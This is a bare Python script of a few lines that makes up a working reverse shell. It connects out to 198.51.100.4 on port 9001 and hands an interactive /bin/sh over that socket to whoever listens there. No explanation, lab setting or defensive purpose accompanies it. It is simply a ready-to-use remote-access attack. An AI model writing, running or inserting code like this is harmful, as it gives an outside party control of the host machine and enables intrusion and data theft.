import socket, subprocess
def go(host, port):
    s = socket.create_connection((host, port))
    p = subprocess.Popen(['/bin/sh', '-i'], stdin=s, stdout=s, stderr=s)
    p.wait()
go('198.51.100.4', 9001)
